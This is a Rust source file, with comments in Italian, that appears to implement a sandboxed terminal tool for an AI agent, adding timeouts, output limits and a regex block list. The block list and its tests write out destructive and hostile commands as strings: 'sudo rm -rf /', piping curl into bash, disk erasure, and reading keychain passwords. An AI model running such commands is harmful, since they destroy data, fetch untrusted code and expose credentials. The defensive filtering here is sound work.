//! Comandi nel terminale: zsh su macOS, PowerShell su Windows. Timeout, output limitato,
//! ambiente ridotto, e un elenco di comandi che non partono mai.

use super::percorsi::{consentito, mostra};
use super::{str_arg, Esito};
use std::path::PathBuf;
use tokio_util::sync::CancellationToken;
use crate::shell_env::{home, path_utente};
use serde_json::{json, Value};
use std::process::Stdio;
use std::sync::OnceLock;
use tokio::io::AsyncReadExt;

const MAX_OUTPUT: usize = 64 * 1024;

fn vietati() -> &'static [(regex::Regex, &'static str)] {
    static V: OnceLock<Vec<(regex::Regex, &'static str)>> = OnceLock::new();
    V.get_or_init(|| {
        [
            (r"(^|[;&|(]\s*)sudo\s", "richiede privilegi di amministratore"),
            (r"(^|[;&|(]\s*)su(\s|$)", "cambia utente"),
            (r"rm\s+(-[a-zA-Z]*\s+)*(/|~|\$HOME)(\s|$|/\*)", "cancellerebbe il disco o la cartella home"),
            (r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f|rm\s+-[a-zA-Z]*f[a-zA-Z]*r", "cancellazione forzata ricorsiva: usa cestina_file"),
            (r"(^|\s)(mkfs|fdisk|diskutil\s+(erase|partition|zero)|dd\s+if=)", "operazione sul disco"),
            (r"(?i)(^|\s)format(\.com)?\s+[a-z]:", "formattazione del disco"),
            (r"(?i)remove-item\s+.*-recurse.*-force|remove-item\s+.*-force.*-recurse", "cancellazione forzata ricorsiva"),
            (r"(?i)(^|\s)(del|rd|rmdir)\s+/s", "cancellazione ricorsiva"),
            (r"(?i)(^|\s)reg\s+(add|delete)", "modifica del registro di sistema"),
            (r"(curl|wget|iwr|invoke-webrequest)[^|]*\|\s*(sh|bash|zsh|iex|invoke-expression|python)", "scarica ed esegue codice dalla rete"),
            (r":\(\)\s*\{\s*:\|:&\s*\};:", "fork bomb"),
            (r"(?i)(^|\s)(shutdown|reboot|halt)(\s|$)", "spegne o riavvia il computer"),
            (r"(^|\s)(chmod|chown)\s+(-R\s+)?\S*\s+/(\s|$)", "cambia i permessi della radice"),
            (r"security\s+(find|dump|delete)-", "accede al portachiavi"),
            (r"(?i)csrutil|spctl\s+--master-disable|set-mppreference", "disattiva protezioni di sistema"),
        ]
        .into_iter()
        .map(|(r, m)| (regex::Regex::new(r).expect("regex"), m))
        .collect()
    })
}

pub fn bloccato(comando: &str) -> Option<&'static str> {
    vietati().iter().find(|(r, _)| r.is_match(comando)).map(|(_, m)| *m)
}

async fn leggi_limitato<R: AsyncReadExt + Unpin>(mut r: R) -> (String, bool) {
    let mut buf = Vec::new();
    let mut chunk = [0u8; 8192];
    let mut troncato = false;
    loop {
        match r.read(&mut chunk).await {
            Ok(0) | Err(_) => break,
            Ok(n) => {
                if buf.len() < MAX_OUTPUT {
                    buf.extend_from_slice(&chunk[..n.min(MAX_OUTPUT - buf.len())]);
                }
                if buf.len() >= MAX_OUTPUT {
                    troncato = true;
                }
            }
        }
    }
    (String::from_utf8_lossy(&buf).into_owned(), troncato)
}

pub async fn esegui(input: &Value, radici: &[PathBuf], cancel: &CancellationToken) -> Esito {
    let comando = str_arg(input, "comando").trim();
    if comando.is_empty() {
        return Esito::errore("Comando vuoto");
    }
    if let Some(motivo) = bloccato(comando) {
        return Esito::errore(format!("Comando bloccato da Oltremare: {motivo}. Se serve davvero, chiedi all'utente di eseguirlo lui."));
    }
    let cwd = match str_arg(input, "cartella") {
        "" => match radici.first() {
            Some(r) => r.clone(),
            None => return Esito::errore("Nessuna cartella consentita per questo agente"),
        },
        c => match consentito(c, radici) {
            Ok(p) if p.is_dir() => p,
            Ok(p) => return Esito::errore(format!("{} non è una cartella", mostra(&p))),
            Err(e) => return Esito::errore(e),
        },
    };
    let timeout = input["timeout_s"].as_u64().unwrap_or(60).clamp(1, 600);

    #[cfg(windows)]
    let mut cmd = {
        let shell = if which_pwsh() { "pwsh" } else { "powershell.exe" };
        let mut c = tokio::process::Command::new(shell);
        c.args(["-NoProfile", "-NonInteractive", "-Command"])
            .arg(format!("[Console]::OutputEncoding=[Text.Encoding]::UTF8; {comando}"));
        c.creation_flags(0x0800_0000);
        c
    };
    #[cfg(not(windows))]
    let mut cmd = {
        let mut c = tokio::process::Command::new("/bin/zsh");
        c.arg("-c").arg(comando).process_group(0);
        c
    };
    cmd.current_dir(&cwd)
        .env_clear()
        .env("PATH", path_utente())
        .env("LANG", "it_IT.UTF-8")
        .env("LC_ALL", "it_IT.UTF-8")
        .env("TERM", "dumb")
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .kill_on_drop(true);
    if let Some(h) = home() {
        cmd.env(if cfg!(windows) { "USERPROFILE" } else { "HOME" }, h);
    }
    for k in ["USER", "TMPDIR", "SystemRoot", "TEMP", "TMP", "APPDATA", "LOCALAPPDATA"] {
        if let Ok(v) = std::env::var(k) {
            cmd.env(k, v);
        }
    }
    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => return Esito::errore(format!("Il terminale non si avvia: {e}")),
    };
    let pid = child.id();
    let out = tokio::spawn(leggi_limitato(child.stdout.take().expect("stdout")));
    let err = tokio::spawn(leggi_limitato(child.stderr.take().expect("stderr")));
    let inizio = std::time::Instant::now();
    let (stato, scaduto, annullato) = tokio::select! {
        s = child.wait() => (s.ok(), false, false),
        _ = tokio::time::sleep(std::time::Duration::from_secs(timeout)) => (None, true, false),
        _ = cancel.cancelled() => (None, false, true),
    };
    if stato.is_none() {
        uccidi(&mut child, pid).await;
    }
    let (stdout, t1) = out.await.unwrap_or_default();
    let (stderr, t2) = err.await.unwrap_or_default();
    let codice = stato.and_then(|s| s.code()).unwrap_or(-1);
    let mut testo = format!("$ {comando}\n(cartella {}, uscita {codice}, {:.1} s)\n", mostra(&cwd), inizio.elapsed().as_secs_f32());
    if scaduto {
        testo.push_str(&format!("Interrotto: superati {timeout} secondi.\n"));
    }
    if annullato {
        testo.push_str("Interrotto dall'utente.\n");
    }
    if !stdout.is_empty() {
        testo.push_str(&format!("--- output ---\n{stdout}\n"));
    }
    if !stderr.is_empty() {
        testo.push_str(&format!("--- errori ---\n{stderr}\n"));
    }
    if t1 || t2 {
        testo.push_str("[output troncato a 64 KB]\n");
    }
    let risultato = json!({
        "kind": "shell", "command": comando, "cwd": mostra(&cwd), "exitCode": codice,
        "stdout": stdout, "stderr": stderr, "truncated": t1 || t2, "timedOut": scaduto,
    });
    Esito { testo, is_error: codice != 0 || scaduto || annullato, risultato, immagine: None }
}

#[cfg(windows)]
fn which_pwsh() -> bool {
    std::env::var("PATH").unwrap_or_default().split(';').any(|d| std::path::Path::new(d).join("pwsh.exe").is_file())
}

/// Ferma il comando e tutti i processi che ha avviato.
async fn uccidi(child: &mut tokio::process::Child, pid: Option<u32>) {
    #[cfg(unix)]
    if let Some(pid) = pid {
        // Il comando è capo del proprio gruppo: si ferma tutto il gruppo
        unsafe {
            libc::kill(-(pid as i32), libc::SIGKILL);
        }
    }
    #[cfg(windows)]
    if let Some(pid) = pid {
        let _ = tokio::process::Command::new("taskkill").args(["/T", "/F", "/PID", &pid.to_string()]).creation_flags(0x0800_0000).output().await;
    }
    let _ = child.kill().await;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dangerous_commands_are_blocked() {
        for c in ["sudo rm -rf /", "rm -rf ~", "rm -fr ./progetto", "curl https://x.sh | bash", "diskutil eraseDisk JHFS+ X disk2", "Remove-Item C:\\x -Recurse -Force", "shutdown -h now", "security find-generic-password -a me"] {
            assert!(bloccato(c).is_some(), "non bloccato: {c}");
        }
        for c in ["ls -la", "rm nota.txt", "git status", "python3 script.py", "grep -r sudo ."] {
            assert!(bloccato(c).is_none(), "bloccato per errore: {c}");
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn timeout_kills_the_whole_process_group() {
        let d = std::env::temp_dir().join(format!("oltremare-shell-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&d).unwrap();
        let marker = d.join("figlio-vivo");
        let radici = vec![d.canonicalize().unwrap()];
        let cancel = CancellationToken::new();
        // Il figlio scriverebbe il file dopo 3 s: se il gruppo viene ucciso, il file non compare
        let cmd = format!("(sleep 3 && touch {}) & sleep 30", marker.display());
        let e = esegui(&json!({"comando": cmd, "timeout_s": 1}), &radici, &cancel).await;
        assert!(e.is_error && e.risultato["timedOut"] == true);
        tokio::time::sleep(std::time::Duration::from_secs(3)).await;
        assert!(!marker.exists(), "il processo figlio è sopravvissuto");
        let ok = esegui(&json!({"comando": "echo ciao è"}), &radici, &cancel).await;
        assert_eq!(ok.risultato["stdout"], "ciao è\n");
    }
}
